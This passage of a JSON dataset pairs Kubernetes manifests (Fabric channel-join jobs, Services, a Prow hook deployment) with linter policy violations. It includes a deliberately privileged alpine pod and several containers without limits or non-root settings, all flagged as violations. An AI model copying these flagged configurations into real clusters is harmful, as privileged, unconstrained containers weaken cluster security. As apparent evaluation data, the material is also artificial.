    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"joinchannel1\" has memory limit 0"
  },
  {
    "id": "9137",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"joinchannel2\" has memory limit 0"
  },
  {
    "id": "9138",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"joinchannel3\" has memory limit 0"
  },
  {
    "id": "9139",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"joinchannel4\" has memory limit 0"
  },
  {
    "id": "9140",
    "manifest_path": "data/manifests/the_stack_sample/sample_3453.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-privileged\nspec:\n  containers:\n  - name: main\n    image: alpine\n    command:\n    - /bin/sleep\n    - '999999'\n    securityContext:\n      privileged: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"main\" is using an invalid container image, \"alpine\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9141",
    "manifest_path": "data/manifests/the_stack_sample/sample_3453.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-privileged\nspec:\n  containers:\n  - name: main\n    image: alpine\n    command:\n    - /bin/sleep\n    - '999999'\n    securityContext:\n      privileged: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"main\" does not have a read-only root file system"
  },
  {
    "id": "9142",
    "manifest_path": "data/manifests/the_stack_sample/sample_3453.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-privileged\nspec:\n  containers:\n  - name: main\n    image: alpine\n    command:\n    - /bin/sleep\n    - '999999'\n    securityContext:\n      privileged: true\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"main\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "9143",
    "manifest_path": "data/manifests/the_stack_sample/sample_3453.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-privileged\nspec:\n  containers:\n  - name: main\n    image: alpine\n    command:\n    - /bin/sleep\n    - '999999'\n    securityContext:\n      privileged: true\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"main\" is privileged"
  },
  {
    "id": "9144",
    "manifest_path": "data/manifests/the_stack_sample/sample_3453.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-privileged\nspec:\n  containers:\n  - name: main\n    image: alpine\n    command:\n    - /bin/sleep\n    - '999999'\n    securityContext:\n      privileged: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"main\" is not set to runAsNonRoot"
  },
  {
    "id": "9145",
    "manifest_path": "data/manifests/the_stack_sample/sample_3453.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-privileged\nspec:\n  containers:\n  - name: main\n    image: alpine\n    command:\n    - /bin/sleep\n    - '999999'\n    securityContext:\n      privileged: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"main\" has cpu request 0"
  },
  {
    "id": "9146",
    "manifest_path": "data/manifests/the_stack_sample/sample_3453.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-privileged\nspec:\n  containers:\n  - name: main\n    image: alpine\n    command:\n    - /bin/sleep\n    - '999999'\n    securityContext:\n      privileged: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"main\" has memory limit 0"
  },
  {
    "id": "9147",
    "manifest_path": "data/manifests/the_stack_sample/sample_3454.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: es-index-rotator\n  namespace: kube-system\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: es-index-rotator\n          image: easzlab/es-index-rotator:0.1.3\n          command:\n          - /bin/rotate.sh\n          - '30'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"es-index-rotator\" does not have a read-only root file system"
  },
  {
    "id": "9148",
    "manifest_path": "data/manifests/the_stack_sample/sample_3454.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: es-index-rotator\n  namespace: kube-system\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: es-index-rotator\n          image: easzlab/es-index-rotator:0.1.3\n          command:\n          - /bin/rotate.sh\n          - '30'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"es-index-rotator\" is not set to runAsNonRoot"
  },
  {
    "id": "9149",
    "manifest_path": "data/manifests/the_stack_sample/sample_3454.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: es-index-rotator\n  namespace: kube-system\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: es-index-rotator\n          image: easzlab/es-index-rotator:0.1.3\n          command:\n          - /bin/rotate.sh\n          - '30'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"es-index-rotator\" has cpu request 0"
  },
  {
    "id": "9150",
    "manifest_path": "data/manifests/the_stack_sample/sample_3454.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: es-index-rotator\n  namespace: kube-system\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: es-index-rotator\n          image: easzlab/es-index-rotator:0.1.3\n          command:\n          - /bin/rotate.sh\n          - '30'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"es-index-rotator\" has memory limit 0"
  },
  {
    "id": "9151",
    "manifest_path": "data/manifests/the_stack_sample/sample_3456.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: git\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: git\n  template:\n    metadata:\n      labels:\n        app: git\n    spec:\n      containers:\n      - envFrom:\n        - secretRef:\n            name: env\n        imagePullPolicy: Never\n        image: git\n        name: git\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"git\" is using an invalid container image, \"git\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9152",
    "manifest_path": "data/manifests/the_stack_sample/sample_3456.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: git\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: git\n  template:\n    metadata:\n      labels:\n        app: git\n    spec:\n      containers:\n      - envFrom:\n        - secretRef:\n            name: env\n        imagePullPolicy: Never\n        image: git\n        name: git\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"git\" does not have a read-only root file system"
  },
  {
    "id": "9153",
    "manifest_path": "data/manifests/the_stack_sample/sample_3456.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: git\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: git\n  template:\n    metadata:\n      labels:\n        app: git\n    spec:\n      containers:\n      - envFrom:\n        - secretRef:\n            name: env\n        imagePullPolicy: Never\n        image: git\n        name: git\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"git\" is not set to runAsNonRoot"
  },
  {
    "id": "9154",
    "manifest_path": "data/manifests/the_stack_sample/sample_3456.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: git\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: git\n  template:\n    metadata:\n      labels:\n        app: git\n    spec:\n      containers:\n      - envFrom:\n        - secretRef:\n            name: env\n        imagePullPolicy: Never\n        image: git\n        name: git\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"git\" has cpu request 0"
  },
  {
    "id": "9155",
    "manifest_path": "data/manifests/the_stack_sample/sample_3456.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: git\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: git\n  template:\n    metadata:\n      labels:\n        app: git\n    spec:\n      containers:\n      - envFrom:\n        - secretRef:\n            name: env\n        imagePullPolicy: Never\n        image: git\n        name: git\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"git\" has memory limit 0"
  },
  {
    "id": "9156",
    "manifest_path": "data/manifests/the_stack_sample/sample_3457.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  namespace: default\n  labels:\n    app.kubernetes.io/name: rancher-demo\n    app.kubernetes.io/part-of: rancher-demo\n  name: rancher-demo\nspec:\n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 8080\n  selector:\n    app.kubernetes.io/name: rancher-demo\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/name:rancher-demo])"
  },
  {
    "id": "9157",
    "manifest_path": "data/manifests/the_stack_sample/sample_3458.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: sspeiche-3375\n  labels:\n    app: sspeiche-3375\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 8080\n    targetPort: 8080\n    protocol: TCP\n    name: http\n  selector:\n    app: sspeiche-3375\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:sspeiche-3375])"
  },
  {
    "id": "9158",
    "manifest_path": "data/manifests/the_stack_sample/sample_3460.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: deno-mvc-service\nspec:\n  type: NodePort\n  ports:\n  - port: 8000\n    nodePort: 30390\n    protocol: TCP\n    targetPort: 8000\n  selector:\n    app: deno-mvc-deployment\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:deno-mvc-deployment])"
  },
  {
    "id": "9159",
    "manifest_path": "data/manifests/the_stack_sample/sample_3461.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210305-64a6d4d83a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "9160",
    "manifest_path": "data/manifests/the_stack_sample/sample_3461.yaml",
